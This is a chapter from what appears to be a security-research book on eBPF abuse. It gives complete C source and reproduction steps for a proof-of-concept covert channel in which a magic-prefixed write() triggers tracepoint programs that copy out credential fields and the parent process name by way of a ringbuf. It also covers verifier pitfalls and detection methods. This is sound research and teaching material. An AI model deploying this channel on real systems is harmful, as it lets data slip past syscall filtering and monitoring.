---
layout: book
title: "Chapter 4: The Phantom Syscall"
date: 2025-02-03
---

# Chapter 4: The Phantom Syscall

> **See also**: [Blog post]({{ site.baseurl }}/the-phantom-syscall.html) · [POC code](https://github.com/mbhatt1/dBPF/tree/master/dBPF-pocs/pocs/ch04-phantom-syscall) · [Harness entry](https://github.com/mbhatt1/dBPF/blob/master/dBPF-pocs/harness/proof.py)

> **Proof status**: `ch04-phantom-syscall` has been proved on Ubuntu 6.17.0 aarch64 (Lima VM, kernel 6.17.0-29-generic). No code changes were required.

I was trying to see how far a tail-called BPF program could walk `task_struct` from a tracepoint on `sys_enter_write` before the verifier got unhappy. The idea was simple: a regular `write()` syscall carrying a magic prefix fires the tracepoint, which tail-calls a second stage that reads kernel-internal credential fields and exfils them via ringbuf. One syscall, three kernel-private values out.

What surprised me was how little the verifier pushed back. Reading `task->cred->uid`, `task->cred->euid`, `task->real_parent->comm` through `BPF_CORE_READ` — all accepted. What it rejected: writes to `task_struct` (e.g., attempting to swap `cred` pointers). So the pattern is exfil, not privilege escalation. That matches how BPF was designed: observation of kernel state is permitted; mutation of core task state is not.

The threat model target is the mundane end of the syscall allowlist. `write()` is in every seccomp profile. A filter that blocks `write()` breaks the process. A monitor that alerts on `write()` drowns in noise. A seccomp filter also cannot inspect the buffer contents; `seccomp_data` does not carry the user buffer pointer's dereferenced bytes. So a `write()` with a magic prefix in the buffer is an allowed syscall whose payload the filter never sees.

## Mechanism

The design splits across two stages to stay within the verifier's stack budget — a constraint I hit painfully on the first attempt, as described below. Stage 1 handles the cheap work of detecting the magic prefix and dispatching; stage 2 handles the expensive work of walking `task_struct` and emitting the event.

### Stage 1; syscall tracepoint detects magic prefix

```c
SEC("tracepoint/syscalls/sys_enter_write")
int tp_write(struct trace_event_raw_sys_enter *ctx) {
    const char __user *buf = (const char __user *)ctx->args[1];
    size_t len = (size_t)ctx->args[2];

    char magic[8];
    if (len < sizeof(magic)) return 0;
    if (bpf_probe_read_user(magic, sizeof(magic), buf) < 0) return 0;
    if (__builtin_memcmp(magic, "PHANTOM\0", 8) != 0) return 0;

    // tail-call into stage 2
    bpf_tail_call(ctx, &jumps, 0);
    return 0;
}
```

### Stage 2; read kernel cred + parent comm, emit ringbuf

```c
SEC("tracepoint/syscalls/sys_enter_write")
int tp_write_stage2(struct trace_event_raw_sys_enter *ctx) {
    struct task_struct *task = (void *)bpf_get_current_task();

    u32 uid  = BPF_CORE_READ(task, cred, uid.val);
    u32 euid = BPF_CORE_READ(task, cred, euid.val);

    char parent_comm[16] = {};
    struct task_struct *parent = BPF_CORE_READ(task, real_parent);
    BPF_CORE_READ_STR_INTO(&parent_comm, parent, comm);

    char payload[48] = {};
    bpf_probe_read_user(payload, sizeof(payload),
                        (void *)ctx->args[1] + 8);  // skip magic

    struct evt e = { .pid = bpf_get_current_pid_tgid() >> 32,
                     .uid = uid, .euid = euid };
    __builtin_memcpy(e.parent, parent_comm, 16);
    __builtin_memcpy(e.payload, payload, 48);
    bpf_ringbuf_output(&events, &e, sizeof(e), 0);
    return 0;
}
```

The loader registers stage 2 in a `BPF_MAP_TYPE_PROG_ARRAY` at slot 0 before attaching stage 1. Without the explicit `bpf_program__set_autoattach(stage2, false)` call, libbpf would attach stage 2 directly to the same tracepoint; every `write()` would emit an event. The autoattach disable is load-bearing.

Stage 1 and stage 2 must have the same section type. My first attempt declared stage 2 as `SEC("raw_tp/sys_enter_write")`. The prog array update failed with `tail_call: program type mismatch`. `SEC("tp/...")` programs are `BPF_PROG_TYPE_TRACEPOINT`; `SEC("raw_tp/...")` programs are `BPF_PROG_TYPE_RAW_TRACEPOINT`. A PROG_ARRAY can only hold programs of the same type as the caller.

## Hook points

- `tracepoint/syscalls/sys_enter_write` (stage 1); magic prefix detection + tail-call.
- `tracepoint/syscalls/sys_enter_write` (stage 2, manual-attach); cred/parent reads + ringbuf emit.

## Verifier friction during development

Three things caused the most grief during development, each for a different reason.

**Stack budget.** The first version put both stages in one handler. The verifier returned `-E2BIG` with `processed stack usage: 528`. The budget is 512. The staged design with per-CPU scratch solves this: the event struct lives in the map across the tail call, and neither stage has it on its stack.

**Unbounded reads.** The first payload copy was `bpf_probe_read_user(&e->payload, len - 8, buf + 8)`. The verifier rejected with `R3 unbounded memory access` because `len - 8` is not proven bounded. The clamp `if (plen > sizeof(e->payload) - 1) plen = sizeof(e->payload) - 1` fixes it.

**PTR_TO_BTF_ID_OR_NULL.** An early draft wrote `s->uid = t->cred->uid.val` directly. The verifier rejected with `R2 type=ptr_or_null_ expected=ptr_`. `BPF_CORE_READ` expands to `bpf_probe_read_kernel` calls that the verifier accepts without a NULL check.

Each of these is a case where the verifier is enforcing real safety properties, not being unnecessarily difficult. The stack budget prevents unbounded stack growth across tail calls. The bounded-access requirement prevents out-of-bounds reads from user memory. The NULL check requirement prevents kernel crashes on NULL dereference. The friction is the verifier doing its job.

## Reproduction

```bash
cd dBPF-pocs/pocs/ch04-phantom-syscall
make
sudo ./build/ch04-phantom-syscall &
# in a separate shell as an unprivileged user
sudo -u nobody /tmp/phantom  # writes "PHANTOM\0<payload>"
# expect:
# [phantom] pid=... uid=65534 euid=65534 parent=bash
#           payload='hello-from-unprivileged-user'
```

The unprivileged process issues exactly one `write()`. From its own userspace perspective, it never had access to `task->real_parent->comm`. With the loader running, all three fields are out.

## Detection

- `bpftool prog list` shows both stages and the PROG_ARRAY.
- `bpftool link list | grep tracepoint` shows two links on `syscalls/sys_enter_write`; the signature of the staged design.
- `/sys/kernel/debug/tracing/events/syscalls/sys_enter_write/enable` will be set.
- Any seccomp filter that audits `bpf(2)` syscalls will see stage 2 being loaded.
- Behavioral: the stage-1 gate runs on every `write()` on the host. At 120 ns/invocation on a busy host issuing 1M writes/sec, the overhead is 120 ms/sec on the relevant core; measurable with `perf stat -e bpf_trace_enter`.

## Scope

This is a Class III primitive from chapter 20 (ringbuf exfil). Nothing in the kernel changes; three kernel-private fields are copied out. Seccomp that allows `write()` sees one syscall — that was the threat model of seccomp, and it still holds exactly as designed; this primitive just sits in the explicit gap.

The cooperative-attacker note: the triggering process must know the magic prefix. This is not a passive exfiltration from an uncooperating process. It is a covert channel between two processes that agreed on the protocol. The `write()` syscall itself completes normally; the tracepoint side-effect is invisible to the caller. The value of this primitive is not in its raw power — Chapter 1's LSM flipper is a stronger tool — but in its shape: it is completely invisible to any syscall-level filter and produces no kernel-side anomaly that a responder would notice without direct BPF program introspection.
